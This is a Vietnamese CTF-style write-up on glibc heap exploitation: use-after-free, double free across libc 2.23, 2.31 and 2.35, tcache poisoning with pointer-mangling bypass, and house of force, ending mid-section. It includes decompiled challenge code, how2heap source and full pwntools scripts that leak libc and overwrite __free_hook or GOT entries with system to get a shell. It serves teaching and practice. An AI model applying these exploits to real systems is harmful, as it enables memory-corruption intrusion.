- User affter free: Như đã nói khi gọi malloc sẽ trả về 1 con trỏ trỏ tới chunk, khi ta gọi free, nó sẽ giải phóng vùng nhớ nhưng con trỏ thì không, nếu ta không set con trỏ = NULL thì có thể thao tác lại trên vùng nhớ đã free --> user affter free
- Double free: Khi ta free 1 vùng nhớ, chunk đó sẽ được đưa vào bin, tuy nhiên nếu con trỏ không được set NULL, ta có thể chỉnh sửa rồi free vùng nhớ đó thêm 1 lần nữa, và trong bin con trỏ fd -> fd --> double free, ta có thể thay đổi giá trị của fd để thao tác với vùng nhớ khác khi gọi free lần 2

## Kĩ thuật
- bug căn bản thì chỉ có như trên, nhưng kĩ thuật trong heap thì có rất nhiều
- Ta có thể nói tới các mốc libc quan trọng:
    - Trước 2.26 chưa có tcache bins, kĩ thuật phần lớn tại fastbins
    - 2.26 đổ về sau: xuất hiện tcachebins, kĩ thuật phần lớn tại tcachebins -> `tcache poisoning`
    - 2.32: xuất hiện mã hóa con trỏ fd, khai thác cần leak heap
    - Ngoài ra các phiên bản libc càng lớn thì cơ chế check các bug ngày càng chặt chẽ, dẫn tới việc khai thác khó hơn, hoặc là cần leak nhiều thứ hơn
- Ta có thể tham khảo các kĩ thuật trên các phiên bản libc tại: `https://github.com/shellphish/how2heap`
# double free 2.23

## Phân tích
```
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  char v3; // [rsp+Fh] [rbp-11h] BYREF
  int v4; // [rsp+10h] [rbp-10h] BYREF
  _DWORD size[3]; // [rsp+14h] [rbp-Ch] BYREF

  *(_QWORD *)&size[1] = __readfsqword(0x28u);
  init(argc, argv, envp);
  puts("Ebook v1.0 - Beta version\n");
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        menu();
        __isoc99_scanf("%d", &v4);
        __isoc99_scanf("%c", &v3);
        if ( v4 != 1 )
          break;
        printf("Size: ");
        __isoc99_scanf("%u", size);
        __isoc99_scanf("%c", &v3);
        ptr = malloc(size[0]);
        printf("Content: ");
        read(0, ptr, size[0]);
        *((_BYTE *)ptr + (unsigned int)(size[0] - 1)) = 0;
      }
      if ( v4 == 2 )
        break;
      switch ( v4 )
      {
        case 3:
          if ( ptr )
          {
            free(ptr);
            puts("Done!");
          }
          else
          {
LABEL_15:
            puts("You didn't buy any book");
          }
          break;
        case 4:
          if ( !ptr )
            goto LABEL_15;
          printf("Content: %s\n", (const char *)ptr);
          break;
        case 5:
          exit(0);
        default:
          puts("Invalid choice!");
          break;
      }
    }
    if ( !ptr )
      goto LABEL_15;
    printf("Content: ");
    read(0, ptr, size[0]);
    *((_BYTE *)ptr + (unsigned int)(size[0] - 1)) = 0;
  }
}
```
- Ta có thể hiểu như sau:
    1. Buy book: nhập size, sau đó malloc theo size, địa chỉ malloc được gán vào con trỏ ptr, nhập dữ liệu vào vùng malloc, byte cuối theo size được gán bằng null
    2. Write book: Sửa lại nội dung tại địa chỉ con trỏ ptr
    3. Erase book: Giải phóng bộ nhớ, nhưng không gán con trỏ ptr = null --> user affter free
    4. Read book: In nội dung theo địa chỉ tại con trỏ ptr
- Ta có lỗi user affter free, ta xem bộ nhớ heap sau khi free:
![image](https://hackmd.io/_uploads/B1o0gZRRJx.png)
- Có thể thấy tại libc 2.23, khi free không dọn dẹp sạch bộ nhớ mà chỉ dọn 8 byte đầu (con trỏ fd), ta có lỗi user affter free --> có thể sửa lại vùng nhớ này
![image](https://hackmd.io/_uploads/rJG5GWA0yg.png)
- Sau đó khi ta malloc lần đầu sẽ trả về vùng `0xbcd3000`, lần 2 sẽ trả về vùng `0x404010`, chọn địa chỉ `0x404010` vì tại libc 2.23, khi malloc lại 1 vùng nhớ nó sẽ check vùng đó có metadata hợp lệ hay không
![image](https://hackmd.io/_uploads/r1Kq7-CRyl.png)
- Tại địa chỉ `0x404010 + 8 = 0x80` ta có thể dùng vùng này làm 1 fake chunks, khi đó malloc sẽ hợp lệ
- Sau đó ta buộc phải nhập dữ liệu bắt đầu từ địa chỉ `0x404020`, tại địa chỉ này nếu nhập dữ liệu khiến stdout không hợp lệ chương trình sẽ báo lỗi, ta chỉ nhập 1 byte cuối là `0x20`, sau đó ta sẽ leak được libc, và với kích thước 0x70 byte ta sẽ thay đổi con trỏ ptr để ghi system vào __free_hook, sau đó khi ta free 1 vùng chứa chuỗi '/bin/sh' thì sẽ lấy được shell
![image](https://hackmd.io/_uploads/r15yI-AAkg.png)
## Fullscript
```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
slan = lambda msg, num: sla(msg, str(num).encode())
san = lambda msg, num: sa(msg, str(num).encode())
sln = lambda num: sl(str(num).encode())
sn = lambda num: s(str(num).encode())
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript=f'''
        user-pwndbg
        # b* main +78
        # b* main +102
        # b* main +155
        # b* main +179
        b* main +241
        b* main +329
        b* main +488
        b* main +192
        b* main +407
        c
        ''')

if args.REMOTE:
    conn = ''.split()
    p = remote(conn[1], int(conn[2]))
else:
    p = process(exe.path)
GDB()

def buy(size, content):
    sla(b'> ', b'1')
    sla(b'Size: ', str(size))
    sa(b'Content: ', content)

def write(content):
    sla(b'> ', b'2')
    sa(b'Content: ', content)

def erase():
    sla(b'> ', b'3')

def read():
    sla(b'> ', b'4')

def exit():
    sla(b'> ', b'5')

buy(0x70, b'a'*0x70)
erase()
write(p64(0x404010))
buy(0x70, b'a'*0x70)
buy(0x70, b'\x20')
read()
ru(b'Content: ')
libc.address = u64(r(6) + b'\x00\x00') - 0x39c620
log.info(hex(libc.address))
log.info(hex(libc.sym['__free_hook']))
pl = p64(libc.address + 3786272) + p64(0)
pl += p64(libc.address + 3782880) + p64(0)
pl += p64(libc.address + 3786048) + p64(0)
pl += p64(0) + p64(libc.sym['__free_hook'])
write(pl)
write(p64(libc.sym['system']))
buy(0x10, b'/bin/sh')
erase()

p.interactive()
```

# Double free 2.31

## Phân tích
- Source bài này giống y hệt libc 2.23 nên ta sẽ không phân tích lại source, ta sẽ đi vào phần heap luôn
![image](https://hackmd.io/_uploads/SkWb_bR01l.png)
- Vùng fd = 0, nhưng sau vùng fd có địa chỉ rác, địa chỉ này sẽ giúp chương trình nhận biết vùng nhớ đã free hay chưa, nếu ta thay đổi vùng này thì ta có thể free thêm 1 lần nữa
- Sau khi free 2 lần thì fd-> fd, `0x156d32a0 -> 0x156d32a0`, sau đó nếu ta thay đổi giá trị tại địa chỉ này, thì chunks cũng sẽ bị thay đổi theo
![image](https://hackmd.io/_uploads/H1is5WR0ye.png)
![image](https://hackmd.io/_uploads/SkL1sZ0R1l.png)
- Khi ta malloc lần 1 sẽ trả về vùng `0x156d3290`, lần 2 sẽ trả về vùng `0x404050`, sau đó ta có thể thay đổi con trỏ ptr
![image](https://hackmd.io/_uploads/HJru3-A01e.png)
- Ta thay đổi con trỏ ptr về stderr để leak libc, sau đó thực hiện lại double free, nhưng lần này thay đổi con trỏ ptr về __free_hook thay đổi thành địa chỉ system
- Sau đó ta free vùng chứa chuỗi '/bin/sh' để lấy shell
![image](https://hackmd.io/_uploads/HkTQ6WA0kg.png)

## Fullscript
```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
slan = lambda msg, num: sla(msg, str(num).encode())
san = lambda msg, num: sa(msg, str(num).encode())
sln = lambda num: sl(str(num).encode())
sn = lambda num: s(str(num).encode())
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript=f'''
        user-pwndbg
        b* main +241
        b* main +329
        b* main +488
        b* main +192
        b* main +407
        c
        ''')

if args.REMOTE:
    conn = ''.split()
    p = remote(conn[1], int(conn[2]))
else:
    p = process(exe.path)
# GDB()

def buy(size, content):
    sla(b'> ', b'1')
    sla(b'Size: ', str(size))
    sa(b'Content: ', content)

def write(content):
    sla(b'> ', b'2')
    sa(b'Content: ', content)

def erase():
    sla(b'> ', b'3')

def read():
    sla(b'> ', b'4')

def exit():
    sla(b'> ', b'5')

buy(0x10, b'a'*0x10)
erase()
write(b'b'*0x10)
erase()
read()
bss = 0x404050
write(p64(bss))
buy(0x10, b'a'*0x10)
buy(0x10, p64(0) + p64(bss - 0x10))
read()
ru(b'Content: ')
libc.address = u64(r(6) + b'\x00\x00') - 2020800
log.info(hex(libc.address))

buy(0x10, b'a'*0x10)
erase()
read()
write(b'b'*0x10)
erase()
read()
write(p64(bss))
buy(0x10, b'a'*0x10)
buy(0x10, p64(0) + p64(libc.sym['__free_hook']))
write(p64(libc.sym['system']))
buy(0x10, b'/bin/sh')
erase()

p.interactive()
```

# Double free 2.35

## Phân tích
- Bài này source giống libc 2.23 nên ta sẽ bỏ qua phân tích source
- Ta sẽ vào phân tích heap luôn
![image](https://hackmd.io/_uploads/rJ-4yGC0Jx.png)
- Ta thấy fd chứa 2,5 byte cao vùng heap, sau đó là địa chỉ rác, ta sẽ leak 2,5 byte heap này để có địa chỉ heap
```
buy(0x10, b'a'*0x10)
erase()
read()
ru(b'Content: ')
heap_chunk = (u32(b'\x00' + r(3)) << 4) + 672
log.info(hex(heap_chunk))
```
- Sau đó ta thay đổi 2,5 địa chỉ heap này để có thể free 1 lần nữa, giống bài trên, fd -> fd, tuy nhiên từ libc 2.35 đã có cơ chế mã hóa, nên ta nhìn trên heap nó sẽ khác trong tcachebins
![image](https://hackmd.io/_uploads/H1IWbGRCJl.png)
- heap mã hóa = heap ^ key --> key = heap ^ heap mã hóa
- Ta có thể leak heap mã hóa, heap --> có thể tìm key, sau đó address target mã hóa = address target ^ key
![image](https://hackmd.io/_uploads/Hy9ZMfCA1g.png)
- Sau đó sẽ giống như bài libc 2.23, tuy nhiên trong bài này sau khi ghi system vào __free_hook nhưng khi free vùng chứa địa chỉ chứa chuỗi '/bin/sh' thì không lấy được shell, nên ta sẽ quay xe sang leak stack bằng địa chỉ envion
```
erase()
write(b'c'*0x10)
erase()
write(p64(bss))
buy(0x10, b'a'*0x10)
buy(0x10, p64(0) + p64(libc.sym.environ))

pop_rdi = 0x0000000000401563

read()
ru(b'Content: ')
stack_leak = u64(r(6) + b'\x00\x00') - 336
log.info(hex(stack_leak))
```
- Sau đó ta sẽ ret2libc qua ret read
```
buy(0x20, b'a'*0x20)
erase()
write(b'c'*0x20)
erase()
write(p64(bss))
buy(0x20, b'a'*0x20)
buy(0x20, p64(0) + p64(stack_leak))

pl = p64(pop_rdi + 1) + p64(pop_rdi) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym['system'])
# GDB()
write(pl)
```
![image](https://hackmd.io/_uploads/ryz-mGCCye.png)

## Fullscript
```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
slan = lambda msg, num: sla(msg, str(num).encode())
san = lambda msg, num: sa(msg, str(num).encode())
sln = lambda num: sl(str(num).encode())
sn = lambda num: s(str(num).encode())
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript=f'''
        user-pwndbg
        b* main +241
        b* main +329
        b* main +488
        b* main +192
        b* main +407
        c
        ''')

if args.REMOTE:
    conn = ''.split()
    p = remote(conn[1], int(conn[2]))
else:
    p = process(exe.path)
# GDB()

def buy(size, content):
    sla(b'> ', b'1')
    sla(b'Size: ', str(size))
    sa(b'Content: ', content)

def write(content):
    sla(b'> ', b'2')
    sa(b'Content: ', content)

def erase():
    sla(b'> ', b'3')

def read():
    sla(b'> ', b'4')

def exit():
    sla(b'> ', b'5')

buy(0x10, b'a'*0x10)
erase()
read()
ru(b'Content: ')
heap_chunk = (u32(b'\x00' + r(3)) << 4) + 672
log.info(hex(heap_chunk))
write(b'b'*8)
erase()
read()
ru(b'Content: ')
heap_crypto = u32(r(4))
log.info(hex(heap_crypto))
key = heap_chunk ^ heap_crypto
bss = (0x404050 ^ key) & 0x0fffffff
write(p64(bss))
buy(0x10, b'c'*16)
buy(0x10, p64(0) + p64(0x404040))
read()
ru(b'Content: ')
libc.address = u64(r(6) + b'\x00\x00') - 2205344
log.info(hex(libc.address))
log.info(hex(libc.sym['system']))
buy(0x10, b'a'*0x10)
erase()
write(b'c'*0x10)
erase()
write(p64(bss))
buy(0x10, b'a'*0x10)
buy(0x10, p64(0) + p64(libc.sym.environ))

pop_rdi = 0x0000000000401563

read()
ru(b'Content: ')
stack_leak = u64(r(6) + b'\x00\x00') - 336
log.info(hex(stack_leak))
buy(0x20, b'a'*0x20)
erase()
write(b'c'*0x20)
erase()
write(p64(bss))
buy(0x20, b'a'*0x20)
buy(0x20, p64(0) + p64(stack_leak))

pl = p64(pop_rdi + 1) + p64(pop_rdi) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym['system'])
# GDB()
write(pl)
p.interactive()
```

# tcache poisoning 2.31

## Phân tích
```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+0h] [rbp-10h] BYREF
  unsigned int v5; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v6; // [rsp+8h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  init(argc, argv, envp);
  puts("Notebook v1.0 - Beta version");
  puts("A place where you can save your note!\n");
  while ( 1 )
  {
    menu();
    __isoc99_scanf("%d", &v4);
    printf("Index: ");
    __isoc99_scanf("%d", &v5);
    switch ( v4 )
    {
      case 1:
        add_note(v5);
        break;
      case 2:
        edit_note(v5);
        break;
      case 3:
        remove_note(v5);
        break;
      case 4:
        read_note(v5);
        break;
      case 5:
        exit(0);
      default:
        puts("Invalid choice!");
        break;
    }
  }
}
```
- Trong main cho ta chọn index
    1. add_note
    ![image](https://hackmd.io/_uploads/BkgM4f001x.png)
    - Trong đây nhập size, rồi malloc theo size, sau đó nhập dữ liệu vào vùng malloc qua hàm read
    2. edit_note
    ![image](https://hackmd.io/_uploads/rJt3EzR0yx.png)
    - Sửa lại dữ liệu trong vùng malloc
    3. remove_note
    ![image](https://hackmd.io/_uploads/B1Jxrz0CJl.png)
    - free vùng malloc và gán con trỏ trỏ tới vùng malloc = null
    4. read_note
    ![image](https://hackmd.io/_uploads/BJlL9Sf0C1g.png)
    - In dữ liệu
- Nhìn bài này khá cẩn thận, tuy nhiên index không check giá trị âm --> OOB
![image](https://hackmd.io/_uploads/H1SLUGRCyx.png)
- Nếu ta nhập index âm, địa chỉ heap trả về sẽ ghi vào phần size --> gây lỗi heap overflow
![image](https://hackmd.io/_uploads/rJYJvGR0Je.png)
- Size của index 1 đã thành `0x000000103a81f2c0`, sau đó khi ta sửa index 0, ta có thể viết tràn xuống các vùng heap khác, ta sẽ malloc lần lượt index 1 và 2, sau đó free 2 rồi 1, khi đó fd 1 sẽ trỏ về fd 2
![image](https://hackmd.io/_uploads/BJpK2FAAkl.png)
- Ta sẽ thay đổi con trỏ này để khi gọi maloc lần 2 sẽ trả về địa chỉ target
![image](https://hackmd.io/_uploads/r1bMTY001l.png)
- Ta sẽ chỉnh index 0 về GOT free để leak libc và thay đổi địa chỉ GOT free thành địa chỉ system, sau đó free vùng chứa chuỗi '/bin/sh' lấy shell
![image](https://hackmd.io/_uploads/BycsTY0Akl.png)

## Fullscript
```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall1_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
slan = lambda msg, num: sla(msg, str(num).encode())
san = lambda msg, num: sa(msg, str(num).encode())
sln = lambda num: sl(str(num).encode())
sn = lambda num: s(str(num).encode())
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript=f'''
        user-pwndbg
        b* read_note +127
        b* remove_note +115
        b* edit_note +168
        b* add_note +166
        b* add_note +300
        c
        ''')

if args.REMOTE:
    conn = ''.split()
    p = remote(conn[1], int(conn[2]))
else:
    p = process(exe.path)
GDB()

def add(index, size, data):
    sla(b'> ', b'1')
    sla(b'Index: ', str(index))
    sla(b'Size: ', str(size))
    sa(b'Data: ', data)

def edit(index, data):
    sla(b'> ', b'2')
    sla(b'Index: ', str(index))
    sa(b'Data: ', data)

def remove(index):
    sla(b'> ', b'3')
    sla(b'Index: ', str(index))

def read(index):
    sla(b'> ', b'4')
    sla(b'Index: ', str(index))

def exit():
    sla(b'> ', b'5')
    sla(b'Index: ', b'1')

bss = 0x4040e0

add(0, 0x10, b'b'*0x10)
add(-4, 0x10, b'a'*0x10)
add(1, 0x10, b'c'*0x10)
add(2, 0x10, b'd'*0x10)
remove(2)
remove(1)
pl = b'a'*0x10 + p64(0) + p64(0x21) + b'b'*0x10 + p64(0) + p64(0x21) + p64(bss)
edit(0, pl)
add(1, 0x10, b'c'*0x10)
add(2, 0x10, p64(0x404018))

# GDB()

read(0)
ru(b'Data: ')
libc.address = u64(r(6) + b'\x00\x00') - 575296
log.info(hex(libc.address))
edit(0, p64(libc.sym['system']))
add(4, 0x10, b'/bin/sh')
remove(4)

p.interactive()
```

# Tcache poisoning 2.35

## Phân tích
- Bài này source giống tcache poisoning 2.31 nên ta sẽ không phân tích lại source
- Ta sẽ đi luôn vào heap
- libc 2.32 khác 2.31 là mã hóa con trỏ tại fd sau khi free, vậy mục tiêu ta phải leak heap và địa chỉ heap mã hóa trước
- Tương tự như bài trên, ta sẽ dùng lỗi OOB để thay đổi size index 0, sau đó sử dụng lỗi heap overflow để dùng kĩ thuật tcache poisoning
![image](https://hackmd.io/_uploads/B1UUk50Ckl.png)
- Có thể thấy con trỏ vùng fd và trong tcachebins đã khác nhau, do nó đã bị mã hóa bằng: heap mã hóa = heap ^ key --> ta cần heap và heap mã hóa để tính key, sau fd là địa chỉ heap, ta sẽ leak lần lượt địa chỉ heap đã mã hóa và địa chỉ heap qua index 0
```
pl = b'a'*0x40
edit(0, pl)
read(0)
ru(b'a'*0x40)
heap_cripto = u32(r(4))
log.info(hex(heap_cripto))
pl = b'a'*0x60
edit(0, pl)

read(0)
ru(b'a'*0x60)
heap_leak = (u32(b'\x00' + r(3)) << 4) + 768
log.info(hex(heap_leak))
key = heap_leak ^ heap_cripto
log.info(key)
```
- Sau đó mọi thứ giống y hệt bài libc 2.31, chỉ khác chỗ địa chỉ ta thay đổi tại fd phải ^ key
![image](https://hackmd.io/_uploads/SJm3eqRRkl.png)
![image](https://hackmd.io/_uploads/HJD0e5001e.png)

## Full script
```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall1_patched")
libc = ELF("./libc-2.32.so")
ld = ELF("./ld-2.32.so")

context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
slan = lambda msg, num: sla(msg, str(num).encode())
san = lambda msg, num: sa(msg, str(num).encode())
sln = lambda num: sl(str(num).encode())
sn = lambda num: s(str(num).encode())
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript=f'''
        user-pwndbg
        b* read_note +127
        b* remove_note +115
        b* edit_note +168
        b* add_note +166
        b* add_note +300
        c
        ''')

if args.REMOTE:
    conn = ''.split()
    p = remote(conn[1], int(conn[2]))
else:
    p = process(exe.path)
GDB()

def add(index, size, data):
    sla(b'> ', b'1')
    sla(b'Index: ', str(index))
    sla(b'Size: ', str(size))
    sa(b'Data: ', data)

def edit(index, data):
    sla(b'> ', b'2')
    sla(b'Index: ', str(index))
    sa(b'Data: ', data)

def remove(index):
    sla(b'> ', b'3')
    sla(b'Index: ', str(index))

def read(index):
    sla(b'> ', b'4')
    sla(b'Index: ', str(index))

def exit():
    sla(b'> ', b'5')
    sla(b'Index: ', b'1')

bss = 0x4040e0

add(0, 0x10, b'b'*0x10)
add(-4, 0x10, b'a'*0x10)
add(1, 0x10, b'c'*0x10)
add(2, 0x10, b'd'*0x10)
remove(2)
remove(1)

pl = b'a'*0x40
edit(0, pl)
read(0)
ru(b'a'*0x40)
heap_cripto = u32(r(4))
log.info(hex(heap_cripto))
pl = b'a'*0x60
edit(0, pl)

read(0)
ru(b'a'*0x60)
heap_leak = (u32(b'\x00' + r(3)) << 4) + 768
log.info(hex(heap_leak))
key = heap_leak ^ heap_cripto
log.info(key)
bss_crypto = bss ^ key & 0x0fffffff
pl = b'a'*0x10 + p64(0) + p64(0x21) + b'b'*0x10 + p64(0) + p64(0x21) + p64(bss_crypto) + p64(0)*2 + p64(0x21)
edit(0, pl)
add(1, 0x10, b'c'*0x10)
add(2, 0x10, p64(0x404018))
add(4, 0x10, b'/bin/sh')

read(0)
ru(b'Data: ')
libc.address = u64(r(6) + b'\x00\x00') - 577264
log.info(hex(libc.address))
edit(0, p64(libc.sym['system']))
remove(4)

p.interactive()
```

# house of force

## Phân tích
- Kĩ thuật này trên how2heap được khai thác tới libc 2.27, các libc sau không còn thấy, vì có sẵn libc 2.23 nên ta sẽ dùng kĩ thuật này trên phiên bản libc này luôn
- Đây là source demo trên how2heap:
```
/*

   This PoC works also with ASLR enabled.
   It will overwrite a GOT entry so in order to apply exactly this technique RELRO must be disabled.
   If RELRO is enabled you can always try to return a chunk on the stack as proposed in Malloc Des Maleficarum 
   ( http://phrack.org/issues/66/10.html )

   Tested in Ubuntu 14.04, 64bit, Ubuntu 18.04

*/


#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>
#include <assert.h>

char bss_var[] = "This is a string that we want to overwrite.";

int main(int argc , char* argv[])
{
	fprintf(stderr, "\nWelcome to the House of Force\n\n");
	fprintf(stderr, "The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n");
	fprintf(stderr, "The top chunk is a special chunk. Is the last in memory "
		"and is the chunk that will be resized when malloc asks for more space from the os.\n");

	fprintf(stderr, "\nIn the end, we will use this to overwrite a variable at %p.\n", bss_var);
	fprintf(stderr, "Its current value is: %s\n", bss_var);



	fprintf(stderr, "\nLet's allocate the first chunk, taking space from the wilderness.\n");
	intptr_t *p1 = malloc(256);
	fprintf(stderr, "The chunk of 256 bytes has been allocated at %p.\n", p1 - 2);

	fprintf(stderr, "\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n");
	int real_size = malloc_usable_size(p1);
	fprintf(stderr, "Real size (aligned and all that jazz) of our allocated chunk is %ld.\n", real_size + sizeof(long)*2);

	fprintf(stderr, "\nNow let's emulate a vulnerability that can overwrite the header of the Top Chunk\n");

	//----- VULNERABILITY ----
	intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size - sizeof(long));
	fprintf(stderr, "\nThe top chunk starts at %p\n", ptr_top);

	fprintf(stderr, "\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n");
	fprintf(stderr, "Old size of top chunk %#llx\n", *((unsigned long long int *)((char *)ptr_top + sizeof(long))));
	*(intptr_t *)((char *)ptr_top + sizeof(long)) = -1;
	fprintf(stderr, "New size of top chunk %#llx\n", *((unsigned long long int *)((char *)ptr_top + sizeof(long))));
	//------------------------

	fprintf(stderr, "\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\n"
	   "Next, we will allocate a chunk that will get us right up against the desired region (with an integer\n"
	   "overflow) and will then be able to allocate a chunk right over the desired region.\n");

	/*
	 * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):
	 * new_top = old_top + nb
	 * nb = new_top - old_top
	 * req + 2sizeof(long) = new_top - old_top
	 * req = new_top - old_top - 2sizeof(long)
	 * req = dest - 2sizeof(long) - old_top - 2sizeof(long)
	 * req = dest - old_top - 4*sizeof(long)
	 */
	unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;
	fprintf(stderr, "\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n"
	   "we will malloc %#lx bytes.\n", bss_var, ptr_top, evil_size);
	void *new_ptr = malloc(evil_size);
	fprintf(stderr, "As expected, the new pointer is at the same place as the old top chunk: %p\n", new_ptr - sizeof(long)*2);

	void* ctr_chunk = malloc(100);
	fprintf(stderr, "\nNow, the next chunk we overwrite will point at our target buffer.\n");
	fprintf(stderr, "malloc(100) => %p!\n", ctr_chunk);
	fprintf(stderr, "Now, we can finally overwrite that value:\n");

	fprintf(stderr, "... old string: %s\n", bss_var);
	fprintf(stderr, "... doing strcpy overwrite with \"YEAH!!!\"...\n");
	strcpy(ctr_chunk, "YEAH!!!");
	fprintf(stderr, "... new string: %s\n", bss_var);

	assert(ctr_chunk == bss_var);


	// some further discussion:
	//fprintf(stderr, "This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\n\n");
	//fprintf(stderr, "This because the main_arena->top pointer is setted to current av->top + malloc_size "
	//	"and we \nwant to set this result to the address of malloc_got_address-8\n\n");
	//fprintf(stderr, "In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\n\n");
	//fprintf(stderr, "The av->top after this big malloc will be setted in this way to malloc_got_address-8\n\n");
	//fprintf(stderr, "After that a new call to malloc will return av->top+8 ( +8 bytes for the header ),"
	//	"\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\n\n");

	//fprintf(stderr, "The large chunk with evil_size has been allocated here 0x%08x\n",p2);
	//fprintf(stderr, "The main_arena value av->top has been setted to malloc_got_address-8=0x%08x\n",malloc_got_address);

	//fprintf(stderr, "This last malloc will be served from the remainder code and will return the av->top+8 injected before\n");
}
```
- Ta hiểu đơn giản là nếu ta có địa chỉ heap và địa chỉ target, có lỗi control được top chunk, ta sẽ thay đổi top chunk = -1 (0xffffffffffffffff), để chương trình hiểu vùng heap còn rất nhiều bộ nhớ, khi malloc lần nữa với kích thước cực kì lớn, nó sẽ không gọi mmap, ta có thể thay đổi top chunk sang vùng target, lần malloc sau ta có thể viết vào vùng target
- Vì viết source chỉ để khai thác được lỗi này, ta sẽ set null con trỏ vào vùng malloc sau khi free, và nhập dữ liệu sau vùng fd, để tránh có thể đi hướng double free hoặc user affter free : ))))))
- Đây là source:
```
#include <stdio.h>
#include<stdlib.h>
#include<string.h>
#include <unistd.h>

char *Size = NULL;
char *name = NULL;

void setup(){
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
}

void menu(){
	puts("1. Your name.");
	puts("2. Change name.");
	puts("3. Remove name.");
	puts("4. Read name.");
	puts("5. Exit.");
	printf("> ");
}

int check(char *name){
	if(name == 0){
		puts("You need create name!");
		return 0;
	}
	return 1;
}

int main(){
	setup();
	long size;
	int choice;

	while(1){
		menu();
		scanf("%u", &choice);
		switch(choice){
		case 1:
			printf("Size: ");
			scanf("%ld", &size);
			name = malloc(size);
			if(!name || size < 0){
				break;
			}
			printf("Name: ");
			read(0, name + 8, size - 8);
			printf("Name: %s\n", name + 8);
			*(void **)(name + size - 8) = (void *)name;
			break;
		case 2:
			if(!check(name)) break;
			printf("Change name: ");
			read(0, name + 8, size);
			break;
		case 3:
			if(!check(name)) break;
			free(name);
			name = 0;
			puts("Done!");
			break;
		case 4:
			if(!check(name)) break;
			printf("Name: %s\n", name + 8);
			break;
		case 5:
			exit(0);
		default:
			puts("Invalid choice.");
		}
	}
	return 0;
}
```
- Ta có thể thấy địa chỉ heap được gán tại vị trí size - 8 --> có thể leak heap
- Trong case 1 bắt đầu nhập là name + 8 nhưng size lại là size - 8 --> không thể overwrite vào top chunk
- Nhưng trong case 2, sửa với size không đổi --> nếu malloc hợp lý, ta có thể vừa đủ 8 byte để overwrite top chunk --> đạt đủ các điều kiện sử dụng kĩ thuật house of froce
- Bài này RELRO không full --> target là địa chỉ GOT

## Exploit
- Đầu tiên ta sẽ leak heap
![image](https://hackmd.io/_uploads/H1xRaL9RCyx.png)
```
name(0x108, b'a'*(0x108 - 8))
read()
ru(b'a'*248)
heap_leak = u32(r(4)) + 256
log.info(hex(heap_leak))
```
- Tính offset để malloc trả về top chunk trong vùng .bss
```
new_top = 0x6010b0
offset = new_top - 0x20 - heap_leak
log.info(offset)
```
- vì địa chỉ top chunk ta lấy = top chunk thật sự - 8, nên bị thừa 8 byte, và địa chỉ target lấy dư, cái này căn chỉnh thêm sao cho khớp sau khi malloc lần 2
- Thay đổi top chunk = 0xffffffffffffffff và thực hiện malloc lần 1 đưa new top chunk về vùng .bss và malloc lần 2 thay đổi con trỏ name
```
change(b'a'*0x100 + p64(0xffffffffffffffff))
